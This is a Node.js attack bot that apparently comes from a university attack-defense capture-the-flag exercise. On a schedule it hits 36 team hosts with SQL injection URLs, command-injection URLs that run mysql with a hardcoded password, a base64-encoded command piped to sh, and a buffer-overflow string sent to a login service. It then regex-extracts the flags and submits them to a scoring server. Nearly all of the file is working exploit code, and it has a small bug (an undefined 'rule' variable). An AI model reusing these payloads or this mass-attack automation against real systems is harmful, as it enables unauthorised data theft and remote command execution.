var http = require('http');
var net = require('net');
var colors = require('colors');
var exec = require('child_process').exec;
var schedule = require('node-schedule');
var program = require('commander');



//
//  Schedules
//

var attackRule = new schedule.RecurrenceRule();
attackRule.minute = [5, 15, 25, 35, 45, 55];

var submitRule = new schedule.RecurrenceRule();
submitRule.second = [0, 5, 10, 15, 20, 25, 30, 35, 40, 45, 50, 55];

//
// submit shit
//
var submitQueue = [];

// push flag to the queue first
var submit = function (flag) {
    submitQueue.push(flag);
}

// enqueue and submit
var submitToServer = function () {
    flag = submitQueue.shift();
    if (flag) {
        console.log('SUBMITTED'.cyan, flag);
        var url = "http://people.cs.nctu.edu.tw/~hwcheng/NSFinal/process.php?ID=13&key=" + flag.toString();
        http.request(url)
            .on('error', function(e) {
                console.log('SUBMIT ERROR: '.red + e.message);
            })
            .end();
    }
}

var parseFlag = function (regex, data) {
    match = data.toString().match(regex);
    if (match) {
        var flag = match[1];
        return match[1];
    }
}

var httpAttack = function (regex, genURL, team) {
    var req = http.request(genURL(team), function (res) {
        res.setEncoding('utf8');
        res.on('data', function (data) {
            flag = parseFlag(regex, data)
            if (flag) {
                console.log('CAPTURED '.yellow, team.toString().green, flag);
                submit(flag);
                req.destroy();
            }
        });
    });
    req.on('error', function(e) {
        console.log('ERROR '.red, team.toString().green, e.message);
        req.destroy();
    });
    req.setTimeout(10000, function () {
        console.log('TIMEOUT '.red, team.toString().green);
        req.destroy();
    });
    req.end();

};

var pmcNameSearchInjectionRegex = /\>\d* (\w*)\<\/div\>/;
var pmcDBPassthruRegex = /id\s+flag\s*\d+\s*(\w+)/
var pmcDBPassthruEchoRegex = /flag\s*(\w+)/

var pmcNameSearchInjectionTarget = function (team) {
    return "http://10.8." + team.toString() + ".100:7788/menu.php/db/name/1'+UNION+SELECT+*+FROM+flag+UNION+SELECT+*+FROM+pm_list+WHERE+id='2";
};
var pmcDBPassthruTarget = function (team) {
    return "http://10.8." + team.toString() + ".100:7788/menu.php/db/passthru/?=;%20mysql%20-D%20pmc%20-u%20joy%20-pchansey%20-e%20%22SELECT%20*%20from%20flag%22";
};
var pmcDBPassthruEchoTarget = function (team) {
    return "http://10.8." + team.toString() + '.100:7788/menu.php/db/passthru/echo+-n+"bXlzcWwgLUQgcG1jIC11IGpveSAtcGNoYW5zZXkgLWUgInNlbGVjdCBmbGFnIGZyb20gZmxhZyI%3D"+%7C+base64+-d+%7C+sh+2>%261';
};
//
//
//  SSP login buffer overflow Attack
//

var sspLoginBufferOverflowRegex = /Exit\n#(\w+)/
var sspLoginBufferOverflow = function (team) {
    var target = {
        port: 5566,
        host: '10.8.' + team.toString() + '.100'
    };

    var req = net.connect(target, function () {
        req.write('11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\n1\n3\n8\n');
    });

    req.on('data', function(data) {
        result = parseFlag(sspLoginBufferOverflowRegex, data);
        if (result) {
            console.log('CAPTURED '.yellow, team.toString().green, result);
            submit(result);
            req.destroy();
        }
    });
    req.on('error', function(e) {
        console.log('ERROR '.red, team.toString().green, e.message);
        req.destroy();
    });
    req.setTimeout(10000, function () {
        console.log('TIMEOUT '.red, team.toString().green);
        req.destroy();
    });

};

var attackAll = function () {
    console.log('====== START ATTACKING ====='.red);
    for (team = 0; team < 36; team++) {
        // PMC name search injection
        httpAttack(pmcNameSearchInjectionRegex, pmcNameSearchInjectionTarget, team);
        // PMC Passthru
        httpAttack(pmcDBPassthruRegex, pmcDBPassthruTarget, team);
        // PMC Passthru Echo
        httpAttack(pmcDBPassthruEchoRegex, pmcDBPassthruEchoTarget, team);
        // SSP Buffer Overflow
        sspLoginBufferOverflow(team);
    }
};



// main
program
    .version('0.0.1')
    .option('-n, --now', 'Attack all attack NOW!!')
    .option('-m, --minute <n>', 'The minute to attack at every hour', parseInt)
    .parse(process.argv);

if (program.minute) {
    if (typeof program.minute === 'number') {
        rule.minute = program.minute;
        console.log('Attacking at __:' + program.minute);
    }
}

if (program.now) {
    attackAll(program);
    schedule.scheduleJob(submitRule, submitToServer);
} else {
    schedule.scheduleJob(attackRule, attackAll);
    schedule.scheduleJob(submitRule, submitToServer);
}
